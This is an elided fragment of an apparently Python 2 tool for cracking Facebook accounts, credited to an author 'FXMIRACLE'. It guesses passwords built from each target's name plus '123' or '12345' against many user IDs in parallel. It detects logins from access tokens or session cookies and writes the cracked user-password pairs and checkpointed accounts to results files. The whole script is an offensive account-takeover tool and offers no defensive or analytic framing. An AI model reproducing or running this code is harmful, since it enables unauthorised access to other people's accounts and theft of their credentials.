...
try:
	...
	print "\033[93;1m\n MECHANIZE MODULE NOT INSRALLED...!"
...
def banner():
	os.system("clear")
	os.system('echo  "\n\n    ▄▄▄       ███▄ ▄███▓ ▄▄▄▄     █████▒\n   ▒████▄    ▓██▒▀█▀ ██▒▓█████▄ ▓██   ▒ \n   ▒██  ▀█▄  ▓██    ▓██░▒██▒ ▄██▒████ ░ \n   ░██▄▄▄▄██ ▒██    ▒██ ▒██░█▀  ░▓█▒  ░ \n    ▓█   ▓██▒▒██▒   ░██▒░▓█  ▀█▓░▒█░    \n    ▒▒   ▓▒█░░ ▒░   ░  ░░▒▓███▀▒ ▒ ░    \n     ▒   ▒▒ ░░  ░      ░▒░▒   ░  ░      \n     ░   ▒   ░      ░    ░    ░  ░ ░    \n         ░  ░       ░    ░              \n                              ░         \n\n╔═══════════════════════════════════════════╗\n║  Author   : miracle Godwin              ║\n║  Github   : https://github.com/FXMIRACLE  ║           \n║  WhatsApp     :    ║       07048277082    \n╚═══════════════════════════════════════════╝" | lolcat -a -d 2 -8')
	print("")
...
class __crack__:
    ...
    def __api__(self, user, __axm__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [FXMIRACLE IS CRACKING] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __axm__:
            pw = pw.lower()
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r  %s*OKENWA-O --> %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OKENWA-OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
                ...
                try:
                    ...
                    print '\r  %s* OKENWA_CP--> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/OKENWA_CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                ...
                print '\r  %s*OKENWA_CP--> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/OKENWA_CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
    ...
    def __mbasic__(self, user, __axm__):
        ...
        for pw in __axm__:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                print '\r  %s* OKENWA-OK--> %s|%s                 %s' % (H,user,pw,N)
    ...
    def __mfb__(self, user, __axm__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [OKENWA IS CRACKING] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __axm__:
            pw = pw.lower()
            try: os.mkdir('results')
            	...
            	for azmx in self.id: 
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            xnx = [name, xz[0]+"123", xz[0]+"12345"]
                        __OkenwaBright__.submit(self.__mbasic__, uid, xnx)
                    except:
                        pass
            	...
            	for azmx in self.id:
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            xnx = [name, xz[0]+"123", xz[0]+"12345"]
                        __OkenwaBright__.submit(self.__mfb__, uid, xnx)
                    except:
                        pass
